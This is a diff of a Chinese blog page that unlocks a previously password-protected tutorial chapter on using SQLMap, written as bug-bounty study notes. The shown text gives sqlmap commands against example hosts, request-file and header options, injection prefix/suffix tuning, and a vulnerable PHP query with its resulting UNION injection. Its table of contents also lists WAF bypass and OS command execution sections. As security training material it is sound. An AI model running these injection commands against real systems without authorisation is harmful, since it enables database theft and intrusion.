@@ -22,30 +22,36 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"www.nohacker.me","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.18.1","exturl":false,"sidebar":{"position":"right","display":"hide","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="有东西被加密了, 请输入密码查看。">
+    <meta name="description" content="【Bug Bounty Hunter】笔记系列">
 <meta property="og:type" content="article">
-<meta property="og:title" content="【Bug Bounty Hunter】第九章-SQLMAP 精要">
+<meta property="og:title" content="【Bug Bounty Hunter】第九章-SQLMap精要">
 <meta property="og:url" content="https://www.nohacker.me/2023/10/15/bug-bounty-hunter-sqlmap-essentials/index.html">
 <meta property="og:site_name" content="黑客与产品">
-<meta property="og:description" content="有东西被加密了, 请输入密码查看。">
+<meta property="og:description" content="【Bug Bounty Hunter】笔记系列">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-img-1256870184.cos.ap-beijing.myqcloud.com/2023-10-16-head_img-1.png">
+<meta property="og:image" content="https://blog-img-1256870184.cos.ap-beijing.myqcloud.com/2023-10-17-M5UVR6n.png">
+<meta property="og:image" content="https://blog-img-1256870184.cos.ap-beijing.myqcloud.com/2023-10-17-x7ND6VQ.png">
+<meta property="og:image" content="https://blog-img-1256870184.cos.ap-beijing.myqcloud.com/2023-10-17-pVBXxRz.png">
 <meta property="article:published_time" content="2023-10-15T12:45:48.000Z">
-<meta property="article:modified_time" content="2023-10-16T15:05:24.339Z">
+<meta property="article:modified_time" content="2023-10-17T08:05:31.273Z">
 <meta property="article:author" content="d4rk30">
 <meta property="article:tag" content="安全">
-<meta property="article:tag" content="Web 安全">
-<meta property="article:tag" content="SQL 注入">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="SQLMap">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-img-1256870184.cos.ap-beijing.myqcloud.com/2023-10-16-head_img-1.png">
 
 
 <link rel="canonical" href="https://www.nohacker.me/2023/10/15/bug-bounty-hunter-sqlmap-essentials/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://www.nohacker.me/2023/10/15/bug-bounty-hunter-sqlmap-essentials/","path":"2023/10/15/bug-bounty-hunter-sqlmap-essentials/","title":"【Bug Bounty Hunter】第九章-SQLMAP 精要"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://www.nohacker.me/2023/10/15/bug-bounty-hunter-sqlmap-essentials/","path":"2023/10/15/bug-bounty-hunter-sqlmap-essentials/","title":"【Bug Bounty Hunter】第九章-SQLMap精要"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>【Bug Bounty Hunter】第九章-SQLMAP 精要 | 黑客与产品</title>
+<title>【Bug Bounty Hunter】第九章-SQLMap精要 | 黑客与产品</title>
   
 
 
@@ -105,7 +111,7 @@
   
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
@@ -118,6 +124,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%BF%AB%E9%80%9F%E5%BC%80%E5%A7%8B"><span class="nav-text">一、快速开始</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-SQLMap%E6%A6%82%E8%A7%88"><span class="nav-text">1. SQLMap概览</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SQLMap%E6%94%AF%E6%8C%81%E7%9A%84%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="nav-text">SQLMap支持的注入类型</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-SQLMap%E5%85%A5%E9%97%A8"><span class="nav-text">2. SQLMap入门</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="nav-text">基本使用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%9E%84%E5%BB%BA%E6%94%BB%E5%87%BB"><span class="nav-text">二、构建攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E8%BF%90%E8%A1%8CSQLMap%E5%9C%A8HTTP%E8%AF%B7%E6%B1%82%E4%B8%8A"><span class="nav-text">3. 运行SQLMap在HTTP请求上</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#cURL%E5%91%BD%E4%BB%A4"><span class="nav-text">cURL命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GET-POST-%E8%AF%B7%E6%B1%82"><span class="nav-text">GET&#x2F;POST 请求</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E7%9A%84HTTP%E8%AF%B7%E6%B1%82"><span class="nav-text">完整的HTTP请求</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89SQLMap%E8%AF%B7%E6%B1%82"><span class="nav-text">自定义SQLMap请求</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89HTTP%E8%AF%B7%E6%B1%82"><span class="nav-text">自定义HTTP请求</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%94%BB%E5%87%BB%E8%B0%83%E6%95%B4"><span class="nav-text">4. 攻击调整</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E7%BC%80-%E5%90%8E%E7%BC%80"><span class="nav-text">前缀&#x2F;后缀</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BA%A7%E5%88%AB-%E9%A3%8E%E9%99%A9"><span class="nav-text">级别&#x2F;风险</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9E%9A%E4%B8%BE"><span class="nav-text">三、数据库枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9E%9A%E4%B8%BE"><span class="nav-text">5. 数据库枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE%E6%9E%9A%E4%B8%BE"><span class="nav-text">基本数据库数据枚举</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A1%A8%E6%A0%BC%E6%9E%9A%E4%B8%BE"><span class="nav-text">表格枚举</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A1%A8%E6%A0%BC-%E8%A1%8C%E6%9E%9A%E4%B8%BE"><span class="nav-text">表格&#x2F;行枚举</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B6%E6%9E%9A%E4%B8%BE"><span class="nav-text">条件枚举</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9E%9A%E4%B8%BE"><span class="nav-text">完整数据库枚举</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9E%9A%E4%B8%BE"><span class="nav-text">6. 高级数据库枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9E%B6%E6%9E%84%E6%9E%9A%E4%B8%BE"><span class="nav-text">数据库架构枚举</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%90%9C%E7%B4%A2%E6%95%B0%E6%8D%AE"><span class="nav-text">搜索数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%86%E7%A0%81%E6%9E%9A%E4%B8%BE%E4%B8%8E%E7%A0%B4%E8%A7%A3"><span class="nav-text">密码枚举与破解</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E6%9E%9A%E4%B8%BE%E4%B8%8E%E7%A0%B4%E8%A7%A3"><span class="nav-text">数据库用户密码枚举与破解</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81SQLMAP%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95"><span class="nav-text">四、SQLMAP高级用法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#7-%E7%BB%95%E8%BF%87%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4"><span class="nav-text">7. 绕过网络应用程序保护</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Anti-CSRF-Token%E7%BB%95%E8%BF%87"><span class="nav-text">Anti-CSRF Token绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Unique-Value%E7%BB%95%E8%BF%87"><span class="nav-text">Unique Value绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Calculated-Parameter%E7%BB%95%E8%BF%87"><span class="nav-text">Calculated Parameter绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IP%E5%9C%B0%E5%9D%80%E9%9A%90%E8%97%8F"><span class="nav-text">IP地址隐藏</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#User-agent%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="nav-text">User-agent黑名单绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AF%A1%E6%94%B9%E8%84%9A%E6%9C%AC"><span class="nav-text">篡改脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="nav-text">其他绕过方式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9FEXP"><span class="nav-text">8. 操作系统EXP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A3%80%E6%9F%A5DBA%E6%9D%83%E9%99%90"><span class="nav-text">检查DBA权限</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6"><span class="nav-text">读取本地文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6"><span class="nav-text">写入本地文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">操作系统命令执行</span></a></li></ol></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -135,7 +142,7 @@
         </a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
@@ -175,12 +182,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="【Bug Bounty Hunter】第九章-SQLMAP 精要 | 黑客与产品">
+      <meta itemprop="name" content="【Bug Bounty Hunter】第九章-SQLMap精要 | 黑客与产品">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          【Bug Bounty Hunter】第九章-SQLMAP 精要
+          【Bug Bounty Hunter】第九章-SQLMap精要
         </h1>
 
         <div class="post-meta-container">
@@ -198,7 +205,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-10-16 23:05:24" itemprop="dateModified" datetime="2023-10-16T23:05:24+08:00">2023-10-16</time>
+      <time title="修改时间：2023-10-17 16:05:31" itemprop="dateModified" datetime="2023-10-17T16:05:31+08:00">2023-10-17</time>
     </span>
 
   
@@ -231,18 +238,265 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试。" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容。">
-  <script id="hbeData" type="hbeData" data-hmacdigest="f90deff6fbec78215c74d21260b8c4b7305ce14d2196fc9f451ee0ab360c8f79">c16d6d9746aa09854b1bf901e53fd5007d6e7f6249edad714852a7b42fcbe027e064d91ddc6f785fbe39bb743fb5e2469e46b64fae6b9c8550e87336258f2d7411fb2b9dfa3caaa8e9878d784ce370fc5cf3ce205b6f20f15071cf0478783ed5d5e78028a3491b6c55296f2afe5b1529e4248bb3cadb540e374360824ea84f5ee8311003a1198bca45c8fc98d471b2098f091c87048409ab06437ce05803e33879f90a5dce62732e30c0f6d11105077173cd9e1363f00c96679969208eeb63f44e79ab27c2f99218da3bba5ce2162496dac9b580a18eea82749cd4e6a5258fad</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码。</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
+    <div class="post-body" itemprop="articleBody"><p><img data-src="https://blog-img-1256870184.cos.ap-beijing.myqcloud.com/2023-10-16-head_img-1.png" alt="img"></p>
+<blockquote>
+<p>【Bug Bounty Hunter】笔记系列</p>
+</blockquote>
+<span id="more"></span>
+<h2 id="一、快速开始"><a href="#一、快速开始" class="headerlink" title="一、快速开始"></a>一、快速开始</h2><h3 id="1-SQLMap概览"><a href="#1-SQLMap概览" class="headerlink" title="1. SQLMap概览"></a>1. SQLMap概览</h3><p><a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">SQLMap</a> 是一款免费且开源的渗透测试工具，使用Python编写，自动化检测和利用SQL注入漏洞。SQLMap自2006年以来一直在不断开发，至今仍在维护。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ python sqlmap.py -u <span class="string">&#x27;http://inlanefreight.htb/page.php?id=5&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="SQLMap支持的注入类型"><a href="#SQLMap支持的注入类型" class="headerlink" title="SQLMap支持的注入类型"></a>SQLMap支持的注入类型</h4><ul>
+<li>B: Boolean-based blind（基于布尔值的盲注）</li>
+<li>E: Error-based（基于错误的）</li>
+<li>U: Union query-based（基于联合查询的）</li>
+<li>S: Stacked queries（堆叠查询）</li>
+<li>T: Time-based blind（基于时间的盲注）</li>
+<li>Q: Inline queries（内联查询）</li>
+</ul>
+<h3 id="2-SQLMap入门"><a href="#2-SQLMap入门" class="headerlink" title="2. SQLMap入门"></a>2. SQLMap入门</h3><p>在开始使用SQLMap时，新用户通常会查看程序的帮助信息。为了帮助新用户，有两个级别的帮助信息列表：</p>
+<ul>
+<li>基本列表仅显示基本参数，在大多数情况下足够使用：-h</li>
+<li>高级列表显示所有参数：-hh</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap -h</span><br><span class="line">d4rk30@linux$ sqlmap -hh</span><br></pre></td></tr></table></figure>
+
+<h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap -u <span class="string">&quot;http://www.example.com/vuln.php?id=1&quot;</span> --batch</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意：在这种情况下，参数<code>-u</code>用于提供目标URL，而参数<code>--batch</code>用于跳过任何必需的用户输入，通过自动选择使用默认参数。</p>
+</blockquote>
+<h2 id="二、构建攻击"><a href="#二、构建攻击" class="headerlink" title="二、构建攻击"></a>二、构建攻击</h2><h3 id="3-运行SQLMap在HTTP请求上"><a href="#3-运行SQLMap在HTTP请求上" class="headerlink" title="3. 运行SQLMap在HTTP请求上"></a>3. 运行SQLMap在HTTP请求上</h3><h4 id="cURL命令"><a href="#cURL命令" class="headerlink" title="cURL命令"></a>cURL命令</h4><p>在Chrome、Edge或Firefox开发者工具的网络面板中，利用<code>Copy as cURL</code>功能是正确设置针对特定目标（即带有参数的Web请求）的SQLMap请求的最佳且最简单的方法之一。</p>
+<p><img data-src="https://blog-img-1256870184.cos.ap-beijing.myqcloud.com/2023-10-17-M5UVR6n.png" alt="img"></p>
+<p>通过将剪贴板内容（Ctrl-V）粘贴到命令行中，并将原始命令<code>curl</code>更改为<code>sqlmap</code>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap <span class="string">&#x27;http://www.example.com/?id=1&#x27;</span> -H <span class="string">&#x27;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0&#x27;</span> -H <span class="string">&#x27;Accept: image/webp,*/*&#x27;</span> -H <span class="string">&#x27;Accept-Language: en-US,en;q=0.5&#x27;</span> --compressed -H <span class="string">&#x27;Connection: keep-alive&#x27;</span> -H <span class="string">&#x27;DNT: 1&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>在向SQLMap提供测试数据时，必须存在可以评估SQL注入漏洞的参数值，或者使用自动参数查找的专用参数参数（例如 <code>--crawl</code>、<code>--forms</code>或<code>-g</code>）。</p>
+<h4 id="GET-POST-请求"><a href="#GET-POST-请求" class="headerlink" title="GET&#x2F;POST 请求"></a>GET&#x2F;POST 请求</h4><p>在最常见的情况下，使用<code>-u</code>或<code>--url</code>测试GET请求。使用<code>--data</code>，可以测试POST请求，如下所示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap <span class="string">&#x27;http://www.example.com/&#x27;</span> --data <span class="string">&#x27;uid=1&amp;name=test&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>在这种情况下，将对POST参数<code>uid</code>和<code>name</code>进行SQL注入漏洞测试。如果有明确表明参数<code>uid</code>容易出现SQL注入漏洞，我们可以使用<code>-p uid</code>将测试范围缩小到该参数。除此之外，我们还可以在提供的数据中使用特殊标记<code>*</code>将其标记出来，如下所示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap <span class="string">&#x27;http://www.example.com/&#x27;</span> --data <span class="string">&#x27;uid=1*&amp;name=test&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="完整的HTTP请求"><a href="#完整的HTTP请求" class="headerlink" title="完整的HTTP请求"></a>完整的HTTP请求</h4><p>如果我们需要指定一个复杂的HTTP请求，其中包含许多不同的Headers和一个内容丰富的POST正文，则可以使用<code>-r</code>参数，利用Burp可以把完整的请求内容复制下来，存储到一个文件中，例如文件名为：req.txt。</p>
+<p><img data-src="https://blog-img-1256870184.cos.ap-beijing.myqcloud.com/2023-10-17-x7ND6VQ.png" alt="img"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap -r req.txt</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>提示：与<code>--data</code>参数的情况类似，我们可以在保存的请求文件中使用星号<code>*</code>指定要注入的参数，例如<code>/?id=*</code>。</p>
+</blockquote>
+<h4 id="自定义SQLMap请求"><a href="#自定义SQLMap请求" class="headerlink" title="自定义SQLMap请求"></a>自定义SQLMap请求</h4><p>例如，如果需要将cookie值指定为 <code>PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c</code>，则使用参数<code>--cookie</code>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap ... --cookie=<span class="string">&#x27;PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用参数<code>-H/--header</code>可以实现相同的效果：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap ... -H=<span class="string">&#x27;Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以将同样的方法应用到参数，如<code>--host</code>，<code>--referer</code>和<code>-A / --user-agent</code>，它们用于指定相同的HTTP标头值。此外，还有一个参数<code>--random-agent</code>，旨在从包含的常规浏览器值数据库中随机选择一个User-agent的值。</p>
+<p>此外，如果我们想要指定一个除了GET和POST之外的替代HTTP方法（例如PUT），我们可以使用参数<code>--method</code>，如下所示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap -u www.target.com --data=<span class="string">&#x27;id=1&#x27;</span> --method PUT</span><br></pre></td></tr></table></figure>
+
+<h4 id="自定义HTTP请求"><a href="#自定义HTTP请求" class="headerlink" title="自定义HTTP请求"></a>自定义HTTP请求</h4><p>除了最常见的表单数据POST请求体格式，SQLMap还支持JSON格式和XML格式的HTTP请求。</p>
+<p>对于这些格式的支持是以“宽松”的方式实现的；因此，对参数值在内部存储的方式没有严格的限制。如果POST请求体相对简单且较短，参数–data就足够了。</p>
+<p>然而，对于复杂或长的POST请求体，我们可以再次使用-r参数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ <span class="built_in">cat</span> req.txt</span><br><span class="line">HTTP / HTTP/1.0</span><br><span class="line">Host: www.example.com</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;data&quot;</span>: [&#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;articles&quot;</span>,</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attributes&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;title&quot;</span>: <span class="string">&quot;Example JSON&quot;</span>,</span><br><span class="line">      <span class="string">&quot;body&quot;</span>: <span class="string">&quot;Just an example&quot;</span>,</span><br><span class="line">      <span class="string">&quot;created&quot;</span>: <span class="string">&quot;2020-05-22T14:56:29.000Z&quot;</span>,</span><br><span class="line">      <span class="string">&quot;updated&quot;</span>: <span class="string">&quot;2020-05-22T14:56:28.000Z&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;relationships&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;author&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;data&quot;</span>: &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;42&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;user&quot;</span>&#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-攻击调整"><a href="#4-攻击调整" class="headerlink" title="4. 攻击调整"></a>4. 攻击调整</h3><p>SQLMap在检测阶段。发送到目标的每个有效的Payload由两部分组成：</p>
+<ul>
+<li>向量（vector ）：有效的SQL代码的载体，是Payload的核心部分，将在目标处执行。</li>
+<li>边界（boundaries）：前缀和后缀形式，用于将向量正确注入易受攻击的SQL语句中。</li>
+</ul>
+<p>两者共同组成的最终测试的Payload。</p>
+<h4 id="前缀-后缀"><a href="#前缀-后缀" class="headerlink" title="前缀&#x2F;后缀"></a>前缀&#x2F;后缀</h4><p>在一些罕见情况下，SQLMap运行时需要特殊的前缀和后缀值，这些值不在正常情况下的覆盖范围内。对于这样的运行，可以使用参数<code>--prefix</code>和<code>--suffix</code>，如下所示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap -u <span class="string">&quot;www.example.com/?q=test&quot;</span> --prefix=<span class="string">&quot;%&#x27;))&quot;</span> --suffix=<span class="string">&quot;-- -&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这会让测试的向量被封装在静态前缀<code>%&#39;))</code>和后缀<code>-- -</code>之间。例如，如果目标中的易受攻击代码是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT id,name,surname FROM users WHERE id LIKE ((&#x27;&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&quot;q&quot;</span>] . <span class="string">&quot;&#x27;)) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br></pre></td></tr></table></figure>
+
+<p>测试的向量是<code>UNION ALL SELECT 1,2,VERSION()</code>，最终产生的SQL语句如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id,name,surname <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="keyword">LIKE</span> ((<span class="string">&#x27;test%&#x27;</span>)) <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,VERSION()<span class="comment">-- -&#x27;)) LIMIT 0,1</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="级别-风险"><a href="#级别-风险" class="headerlink" title="级别&#x2F;风险"></a>级别&#x2F;风险</h4><p>默认情况下，SQLMap结合了预定义的最常见边界（即前缀&#x2F;后缀对）和在存在漏洞的目标情况下成功率较高的向量集。除此之外还可以使用已经包含在SQLMap中的更大的边界和向量集。</p>
+<p>对于这样的要求，应该使用参数<code>--level</code>和<code>--risk</code>：</p>
+<ul>
+<li>参数<code>--level</code>（1-5，默认为1）扩展了使用的向量和边界。</li>
+<li>参数<code>--risk</code>（1-3，默认为1）根据它们在目标端引起问题的风险（即数据库条目丢失或拒绝服务的风险）扩展了使用的向量集。</li>
+</ul>
+<p>为了检查不同level和risk值的使用边界和有效载荷之间的差异的最佳方法是使用<code>-v</code>参数设置详细程度(0-6,默认是1)。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d4rk30@linux$ sqlmap -u www.example.com/?<span class="built_in">id</span>=1 -v 3 --level=5 --risk=3</span><br></pre></td></tr></table></figure>
+
